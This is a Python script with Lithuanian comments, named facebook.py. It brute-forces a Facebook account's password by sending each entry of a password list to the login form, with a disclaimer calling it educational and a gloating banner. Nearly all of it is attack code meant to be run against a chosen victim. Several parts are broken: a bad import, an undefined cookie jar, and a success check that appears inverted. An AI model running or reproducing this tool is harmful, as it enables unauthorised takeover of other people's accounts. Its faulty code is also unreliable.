#!usr/bin/python
import sys
import random
import mechanize
import cookiejar
GHT = '''
	Pradedama Brute-Force ataka muhahahahaha!!
'''
print("!!!Si programa sukurta mokomajam tikslui ir naudojimas sios programos kitiems reikmems yra nelegalus!!!")
email = str(input("# Irasykite |Elektronini pasta| |Telefono numeri| |Profilio ID numeri| |Prisijungimo varda| : "))
passwordlist = str(input("# Irasykite slaptazodzio faila : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):
    
  try:
     sys.stdout.write("\r[*] bandomas %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log == login: ##tikrina ar slaptazodis yra teisingas
        print ("\n\n\n [*] Slaptazodis rastas .. !!")
        print ("\n [*] Slaptazodis : %s\n" % (password))
        sys.exit(1)
  except KeyboardInterrupt: ##suvedus   CTRL+C kombinacija porgrama isijungia
        print ("\n[*] Programa isjungiama .. ")
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
        from http.cookiejar import CookieJar
    except ImportError:
        from cookielib import CookieJar
    try:
       br = mechanize.Browser()
       
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:##suvedus   CTRL+C kombinacija porgrama isijungia
       print ("\n[*] Programa isjungiama ..\n")
       sys.exit(1)
    try:

       list = open(passwordlist, "r")##atidaro passwordo faila ir ji skaito po 1
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print ("\n [*] Error: patikrink slaptazodziu saraso kelia \n")
        sys.exit(1)
    except KeyboardInterrupt:##suvedus   CTRL+C kombinacija porgrama isijungia
        print ("\n [*] Programa isjungiama ..\n")
        sys.exit(1)
    try:
        print (GHT)
        print (" [*] Lauziama paskyra : %s" % (email))
        print (" [*] Pakrauti :" , len(passwords), "passwords")
        print (" [*] Lauziamasi, prasome palaukti ...")
    except KeyboardInterrupt:##suvedus   CTRL+C kombinacija porgrama isijungia
        print ("\n [*] Programa isjungiama ..\n")
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:##suvedus   CTRL+C kombinacija porgrama isijungia
        print ("\n [*] Programa isjungiama ..\n")
        sys.exit(1)

if __name__ == '__main__':
    check()
facebook.py
